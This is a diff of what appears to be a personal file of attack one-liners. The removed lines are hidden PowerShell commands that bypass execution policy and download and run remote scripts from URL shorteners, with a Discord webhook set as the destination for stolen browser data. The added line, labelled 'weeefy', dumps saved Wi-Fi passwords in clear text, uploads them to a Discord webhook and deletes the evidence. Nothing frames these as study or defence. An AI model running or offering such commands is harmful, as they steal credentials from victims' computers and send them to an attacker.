@@ -1,12 +1,4 @@
-powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1219284609024659466/xK7yZtmaz5iX5QtrZKbqGOjl4fkV8t_bY6l-tRH05MnDpwAQSVQr6ZtnZvZe3UrGZzcO'; irm https://is.gd/bw_info_to_dc | iex
+weeefy:
 
-powershell -NoP -Ep Bypass -W H -C $dc='powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1219284609024659466/xK7yZtmaz5iX5QtrZKbqGOjl4fkV8t_bY6l-tRH05MnDpwAQSVQr6ZtnZvZe3UrGZzcO'; irm https://is.gd/bw_info_to_dc | iex
-'; irm https://t.ly/rJl5k | iex
+cd $env:tmp;netsh wlan export profile key=clear;Select-String -Path Wi*.xml -Pattern 'keyMa*' > Wi-Fi;curl.exe -F "f=@Wi-Fi" "https://discord.com/api/webhooks/1291043643804614757/c1V5o7T1Ss0t1fMThP98fAZK9mFCrB9tK4gCWProZ3RgHdl1VHvBy_lGudQPI_eVWKsc";rm "Wi-*"
 
-
-powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1219284609024659466/xK7yZtmaz5iX5QtrZKbqGOjl4fkV8t_bY6l-tRH05MnDpwAQSVQr6ZtnZvZe3UrGZzcO'; irm https://t.ly/rJl5k | iex
-
-
-----------------------------------------------------------------------------
-
-powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1219284609024659466/xK7yZtmaz5iX5QtrZKbqGOjl4fkV8t_bY6l-tRH05MnDpwAQSVQr6ZtnZvZe3UrGZzcO'; irm https://is.gd/bw_ex_to_dc | iex
